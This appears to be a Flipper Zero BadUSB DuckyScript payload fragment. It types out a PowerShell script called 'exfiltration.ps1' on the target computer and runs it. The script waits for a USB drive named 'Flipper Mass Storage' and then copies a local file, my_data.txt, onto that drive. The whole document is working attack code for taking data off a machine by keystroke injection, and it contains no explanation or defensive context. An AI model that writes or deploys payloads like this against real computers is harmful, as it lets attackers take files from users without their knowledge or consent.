REM Create a PowerShell script to do the exfiltration
STRINGLN @'
STRINGLN $targetFriendlyName = "Flipper Mass Storage"
STRINGLN $sourceFile = "my_data.txt"
STRINGLN Write-Host "Waiting for MASSSTORAGE..."
STRINGLN while ($true) {
STRINGLN $usbDrive = Get-CimInstance Win32_DiskDrive | Where-Object {
STRINGLN $_.InterfaceType -eq "USB" -and $_.Model -like "*$targetFriendlyName*"
STRINGLN }
STRINGLN if ($usbDrive) {
STRINGLN     # Get drive letter
STRINGLN     $partitions = Get-CimAssociatedInstance -InputObject $usbDrive -Association Win32_DiskDriveToDiskPartition
STRINGLN     $logicalDisks = foreach ($p in $partitions) {
STRINGLN         Get-CimAssociatedInstance -InputObject $p -Association Win32_LogicalDiskToPartition
STRINGLN     }
STRINGLN     $driveLetter = $logicalDisks.DeviceID
STRINGLN     if ($driveLetter -and (Test-Path "$driveLetter\")) {
STRINGLN         Write-Host "USB detected at $driveLetter"
STRINGLN         # Copy file
STRINGLN         Copy-Item -Path $sourceFile -Destination "$driveLetter\" -Force
STRINGLN         Write-Host "File copied successfully"
STRINGLN         break
STRINGLN     }
STRINGLN }
STRINGLN Start-Sleep -Seconds 3
STRINGLN }
STRINGLN '@ | Set-Content "exfiltration.ps1" -Encoding UTF8 -Force
DELAY 500

REM Execute the pwscript
STRINGLN .\exfiltration.ps1
